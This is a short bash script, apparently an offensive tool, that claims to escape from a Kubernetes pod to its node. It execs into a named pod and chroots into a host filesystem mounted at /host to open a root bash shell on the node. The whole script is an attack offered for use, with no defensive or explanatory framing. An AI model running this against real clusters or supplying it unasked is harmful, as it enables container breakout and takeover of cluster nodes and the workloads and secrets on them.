#!/bin/bash
# Escape from a Kubernetes pod to the node
# Usage: k8s_pod_escape.sh <pod_name> <namespace>

POD_NAME=$1
NAMESPACE=$2

if [ -z "$POD_NAME" ] || [ -z "$NAMESPACE" ]; then
    echo "Usage: $0 <pod_name> <namespace>"
    exit 1
fi

echo "Escaping from pod: $POD_NAME in namespace: $NAMESPACE"

kubectl exec -it $POD_NAME -n $NAMESPACE -- /bin/sh -c "chroot /host /bin/bash"

echo "Escape attempt completed."
